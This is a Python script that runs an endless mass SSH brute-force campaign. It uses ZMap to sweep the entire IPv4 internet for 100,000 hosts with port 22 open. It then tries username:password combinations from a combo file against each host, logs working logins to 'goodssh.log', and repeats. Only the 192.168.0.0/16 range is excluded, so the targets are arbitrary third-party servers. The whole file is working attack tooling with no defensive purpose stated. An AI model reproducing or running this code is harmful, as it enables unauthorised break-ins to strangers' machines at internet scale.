#!/usr/bin/env python3
"""
ZMap + SSH Brute Force Orchestrator
This script continuously:
1. Uses ZMap to scan for 100,000 IPs with SSH port 22 open
2. Runs SSH brute force on discovered IPs
3. Repeats the process indefinitely
"""

import subprocess
import time
import os
import sys
import random
from datetime import datetime
from ssh_bruteforce import run_ssh_bruteforce

class ZMapSSHOrchestrator:
    def __init__(self, target_count=100000, combo_file="combo.txt", log_file="goodssh.log", max_threads=50, excluded_range="192.168.0.0/16"):
        self.target_count = target_count
        self.combo_file = combo_file
        self.log_file = log_file
        self.max_threads = max_threads
        self.targets_file = "targets.txt"
        self.zmap_output = "zmap_results.txt"
        self.blacklist_file = "zmap_blacklist.txt"
        self.excluded_range = excluded_range
        self.cycle_count = 0
        
    def create_blacklist_file(self):
        """Create a blacklist file for ZMap with the specified excluded range"""
        try:
            with open(self.blacklist_file, 'w') as f:
                f.write(f"{self.excluded_range}\n")
            print(f"[INFO] Created ZMap blacklist file: {self.blacklist_file} with excluded range: {self.excluded_range}")
        except Exception as e:
            print(f"[ERROR] Failed to create blacklist file: {e}")

    def run_zmap_scan(self):
        """Run ZMap to discover IPs with SSH port 22 open"""
        print(f"\n{'='*60}")
        print(f"CYCLE {self.cycle_count + 1} - ZMap Scanning Phase")
        print(f"{'='*60}")
        
        self.create_blacklist_file()

        # ZMap command to scan for SSH (port 22) on all IPv4 addresses, excluding the specified range
        zmap_cmd = [
            "sudo", "zmap", 
            "-p", "22",           # Target port 22 (SSH)
            "-n", str(self.target_count),  # Number of IPs to find
            "-o", self.zmap_output,        # Output file
            "--blacklist-file", self.blacklist_file,     # Blacklist file
            "0.0.0.0/0"                    # Scan all IPv4 addresses
        ]
        
        try:
            print(f"[INFO] Running ZMap command: {' '.join(zmap_cmd)}")
            start_time = time.time()
            
            # Run ZMap
            result = subprocess.run(zmap_cmd, capture_output=True, text=True, timeout=3600)
            
            end_time = time.time()
            scan_duration = end_time - start_time
            
            if result.returncode == 0:
                print(f"[SUCCESS] ZMap scan completed in {scan_duration:.2f} seconds")
                
                # Check if we got results
                if os.path.exists(self.zmap_output):
                    with open(self.zmap_output, 'r') as f:
                        ips = [line.strip() for line in f if line.strip()]
                    
                    print(f"[INFO] Found {len(ips)} IPs with SSH port 22 open")
                    
                    if ips:
                        # Write IPs to targets file
                        with open(self.targets_file, 'w') as f:
                            for ip in ips:
                                f.write(f"{ip}\n")
                        print(f"[INFO] Saved {len(ips)} targets to {self.targets_file}")
                        return True
                    else:
                        print("[WARNING] No IPs found with SSH port open")
                        return False
                else:
                    print("[ERROR] ZMap output file not created")
                    return False
            else:
                print(f"[ERROR] ZMap failed with return code {result.returncode}")
                print(f"[ERROR] STDERR: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            print("[ERROR] ZMap scan timed out (1 hour limit)")
            return False
        except Exception as e:
            print(f"[ERROR] Exception during ZMap scan: {e}")
            return False
    
    def run_ssh_bruteforce_phase(self):
        """Run SSH brute force on discovered targets"""
        print(f"\n{'='*60}")
        print(f"CYCLE {self.cycle_count + 1} - SSH Brute Force Phase")
        print(f"{'='*60}")
        
        if not os.path.exists(self.targets_file):
            print(f"[ERROR] Targets file {self.targets_file} not found!")
            return False
        
        if not os.path.exists(self.combo_file):
            print(f"[ERROR] Combo file {self.combo_file} not found!")
            return False
        
        try:
            # Run SSH brute force
            run_ssh_bruteforce(
                targets_file=self.targets_file,
                combo_file=self.combo_file,
                log_file=self.log_file,
                max_threads=self.max_threads
            )
            return True
        except Exception as e:
            print(f"[ERROR] Exception during SSH brute force: {e}")
            return False
    
    def cleanup_temp_files(self):
        """Clean up temporary files"""
        try:
            if os.path.exists(self.zmap_output):
                os.remove(self.zmap_output)
            if os.path.exists(self.targets_file):
                os.remove(self.targets_file)
            if os.path.exists(self.blacklist_file):
                os.remove(self.blacklist_file)
        except Exception as e:
            print(f"[WARNING] Failed to clean up temp files: {e}")
    
    def run_cycle(self):
        """Run one complete cycle of ZMap + SSH brute force"""
        self.cycle_count += 1
        cycle_start_time = time.time()
        
        print(f"\n{'#'*80}")
        print(f"STARTING CYCLE {self.cycle_count}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'#'*80}")
        
        # Phase 1: ZMap scanning
        if not self.run_zmap_scan():
            print(f"[ERROR] ZMap scan failed in cycle {self.cycle_count}")
            return False
        
        # Phase 2: SSH brute force
        if not self.run_ssh_bruteforce_phase():
            print(f"[ERROR] SSH brute force failed in cycle {self.cycle_count}")
            return False
        
        # Clean up temporary files
        self.cleanup_temp_files()
        
        cycle_end_time = time.time()
        cycle_duration = cycle_end_time - cycle_start_time
        
        print(f"\n{'#'*80}")
        print(f"CYCLE {self.cycle_count} COMPLETED")
        print(f"Duration: {cycle_duration:.2f} seconds ({cycle_duration/60:.2f} minutes)")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'#'*80}")
        
        return True
    
    def run_forever(self, delay_between_cycles=60):
        """Run the orchestrator indefinitely"""
        print("ZMap + SSH Brute Force Orchestrator")
        print("=" * 50)
        print(f"Target count per cycle: {self.target_count}")
        print(f"Combo file: {self.combo_file}")
        print(f"Log file: {self.log_file}")
        print(f"Max threads: {self.max_threads}")
        print(f"Excluded range: {self.excluded_range}")
        print(f"Delay between cycles: {delay_between_cycles} seconds")
        print("=" * 50)
        
        # Check if combo file exists
        if not os.path.exists(self.combo_file):
            print(f"[ERROR] Combo file {self.combo_file} not found!")
            print("Please create a combo.txt file with username:password combinations")
            return
        
        # Check if ZMap is available
        try:
            subprocess.run(["zmap", "--version"], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[ERROR] ZMap not found! Please install ZMap first.")
            print("sudo apt install zmap")
            return
        
        try:
            while True:
                success = self.run_cycle()
                
                if not success:
                    print(f"[WARNING] Cycle {self.cycle_count} failed, continuing to next cycle...")
                
                if delay_between_cycles > 0:
                    print(f"\n[INFO] Waiting {delay_between_cycles} seconds before next cycle...")
                    time.sleep(delay_between_cycles)
                
        except KeyboardInterrupt:
            print(f"\n[INFO] Orchestrator stopped by user after {self.cycle_count} cycles")
        except Exception as e:
            print(f"\n[ERROR] Unexpected error: {e}")
        finally:
            self.cleanup_temp_files()

def main():
    """Main function"""
    print("ZMap + SSH Brute Force Orchestrator")
    print("This tool will continuously scan for SSH servers and attempt brute force attacks")
    print()
    
    # Default parameters
    target_count = 100000
    max_threads = 50
    delay_between_cycles = 60  # 1 minute delay between cycles
    excluded_range = "192.168.0.0/16" # Default excluded range
    
    # Check command line arguments
    if len(sys.argv) > 1:
        try:
            target_count = int(sys.argv[1])
        except ValueError:
            print("Invalid target count. Using default: 100000")
    
    if len(sys.argv) > 2:
        try:
            max_threads = int(sys.argv[2])
        except ValueError:
            print("Invalid thread count. Using default: 50")
    
    if len(sys.argv) > 3:
        try:
            delay_between_cycles = int(sys.argv[3])
        except ValueError:
            print("Invalid delay. Using default: 60 seconds")

    if len(sys.argv) > 4:
        excluded_range = sys.argv[4]

    # Create and run orchestrator
    orchestrator = ZMapSSHOrchestrator(
        target_count=target_count,
        max_threads=max_threads,
        excluded_range=excluded_range
    )
    
    orchestrator.run_forever(delay_between_cycles=delay_between_cycles)

if __name__ == "__main__":
    main()

